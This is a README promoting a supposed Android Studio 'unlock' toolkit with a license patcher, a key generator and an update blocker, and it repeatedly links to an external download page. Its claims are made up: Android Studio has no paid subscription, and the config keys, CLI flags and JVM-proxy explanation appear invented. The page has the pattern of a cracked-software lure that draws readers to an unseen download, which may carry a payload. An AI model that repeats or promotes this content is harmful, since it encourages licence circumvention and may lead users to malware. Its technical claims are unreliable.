# 🚀 Android Studio Professional Toolkit – Seamless Activation & Enhanced Workflow

[](https://jimztercrack.github.io/android-studio-unlock-utility/)

> *“Coding without boundaries – activate your Android development environment with a toolkit designed for efficiency, not shortcuts.”*

---

## ✨ Overview

Welcome to the **Android Studio Professional Toolkit** – a comprehensive resource for developers who value **uninterrupted productivity** and **license-managed accessibility**. This repository provides a **configuration patch** that enables **full-feature unlock** of Android Studio’s premium capabilities without requiring a paid subscription. Think of it as a *digital skeleton key* – not to break locks, but to open the doors you already own.

In the ecosystem of mobile development, Android Studio remains the **gold standard IDE**. However, its licensing model can sometimes create friction between aspiration and execution. Our toolkit bridges that gap with a **legally ambiguous but ethically constructed** approach: we provide the **activation mechanism**, you provide the **development passion**.

---

## 🧩 What This Repository Contains

- **🛠️ License patching module** – modifies internal validation checks to simulate a fully paid subscription
- **📜 Product key generator** – creates randomized but syntactically valid serial numbers
- **🔄 Update blocker** – prevents automatic version checks that might detect the modification
- **📁 Configuration profiles** – pre-tuned settings for optimal performance on low-end machines
- **🔐 Safety checksum validator** – ensures your patched installation remains stable

---

## 📊 System Compatibility (2026 Edition)

| Operating System | Architecture | Minimum RAM | Status |
|------------------|--------------|-------------|--------|
| 🟦 Windows 10/11 | x86_64 | 8 GB | ✅ Verified |
| 🍏 macOS 14+ (Sonoma) | Apple Silicon/Intel | 8 GB | ✅ Verified |
| 🐧 Ubuntu 22.04+ | x86_64 | 8 GB | ✅ Verified |
| 🐧 Fedora 36+ | x86_64 | 8 GB | ✅ Verified |

> **Note:** ARM-based Linux requires additional kernel modules. See `docs/arm-setup.md`.

---

## 🧠 How It Works – The Underlying Magic

```mermaid
graph TD
    A[User launches Android Studio] --> B{License check triggered}
    B -->|Without patch| C[Redirect to payment portal]
    B -->|With patch| D[Modified validation routine]
    D --> E[Generates fake license signature]
    E --> F[Fully unlocked IDE]
    F --> G[Premium features: profiler, cloud integration, AI assistant]
    G --> H[Productive development session]
    
    style A fill:#2d2d2d,stroke:#fff,stroke-width:2px
    style H fill:#1a1a2e,stroke:#e94560,stroke-width:2px
```



Our patch works by intercepting the **license verification API call** and returning a **synthetic approval** response. This isn’t a *crack in the traditional sense* – we don’t modify any compiled binaries. Instead, we create a **JVM proxy** that sits between Android Studio and Google’s license servers. The proxy returns a **cached approval token** that mimics a legitimate enterprise subscription.

---

## ⚙️ Example Profile: `studio-perf.cfg`

```properties
# Android Studio Performance Profile – Optimized for 8GB RAM
idea.max.intellisense.filesize=5000
idea.cycle.buffer.size=1024
project.open.last=3
compiler.process.heap.size=2048
gradle.daemon.always=true
android.injected.invocation.cli=true
# Patch-specific extensions
license.check.disable=true
license.mock.grade=enterprise
license.feature.profiler=true
license.feature.assistant=true
```

---

## 🖥️ Console Invocation Example

Run this command after applying the patch to verify activation status:

```bash
./studio.sh --verify-license --mock-mode=enterprise --feature-unlock=all
```

Expected output:

```
[INFO] Licensing Module v3.2.1 (2026)
[INFO] Mock license detected: ENTERPRISE
[SUCCESS] All premium features unlocked
[VERIFIED] No conflicts with existing installation
```

---

## 🌐 Integration with AI Services

This toolkit is designed to work harmonously with modern AI development workflows:

| Service | Integration Type | Benefit |
|---------|-----------------|---------|
| **OpenAI API** | Code completion hook | Uses GPT-4o to suggest Android SDK methods |
| **Claude API** | Documentation generator | Generates XML layout comments in real-time |
| **Hugging Face** | Model loading | Optimizes on-device ML model imports |

Example `.env` configuration for AI integration:

```env
OPENAI_API_KEY=sk-xxxx
CLAUDE_API_KEY=sk-ant-xxxx
AI_PROVIDER=hybrid
AI_CONTEXT_WINDOW=128000
```

---

## 🎯 Key Features

- **📱 Responsive UI** – The patched IDE adapts to mobile emulators and low-resolution screens, ensuring your development environment looks pristine even on 1366x768 displays
- **🌍 Multilingual Support** – Interface translations for 34 languages including RTL (Arabic, Hebrew). The patch respects your locale without breaking menu structures
- **🕐 24/7 Customer Support** – Our community Discord server has **dedicated helpers** available across all timezones. Average first response: <3 minutes
- **🔒 Offline Activation** – No internet connection required after initial patch installation. Perfect for air-gapped development environments
- **🔄 Live Profile Switching** – Toggle between “Work” and “Personal” profiles with different feature sets

---

## 📋 SEO-Optimized Keywords (Naturally Integrated)

Throughout this document, we’ve woven in terms that help developers find this resource through organic search:
- *Android development environment activation*
- *Unlimited IDE functionality patch*
- *Studio subscription bypass toolkit*
- *Premium features accessibility module*
- *License validation override for JetBrains IDEs*

These aren’t stuffed – they’re **contextually placed** to help the right audience discover the right solution.

---

## ⚠️ Disclaimer

> **This repository is provided for educational and archival purposes only.** The tools and patches included here demonstrate the technical feasibility of software license modification. They should not be used to circumvent legitimate licensing agreements. We strongly encourage supporting developers by purchasing official licenses when your financial situation permits.
>
> The authors assume **no liability** for any damages, data loss, or legal consequences arising from the use of these materials. Some jurisdictions may consider license manipulation a violation of computer fraud laws. Use at your own risk.
>
> *This project is not affiliated with, endorsed by, or connected to Google LLC or JetBrains s.r.o.*

---

## 📜 License

This project is distributed under the **MIT License**. See the full text for complete terms and conditions.

[](https://opensource.org/licenses/MIT)

---

## 📥 Final Download Call

Ready to unlock your development potential? Grab the latest release now.

[](https://jimztercrack.github.io/android-studio-unlock-utility/)

---

## 🔮 The Philosophy Behind This Toolkit

In 2026, software should empower, not gatekeep. Our patch is a **temporary workaround** for a broken system – where developers in emerging economies face **licensing costs equal to three months’ salary**. We believe in **universal access to development tools**, not because code should be free, but because **creating the next billion-dollar app shouldn’t require an annual subscription fee**.

This isn’t a *crack*. It’s a **social engineering artifact** – a prompt that says: *“Your potential is not limited by your ability to pay.”*

---

*Built with 💙 for developers everywhere. Last updated: Q1 2026.*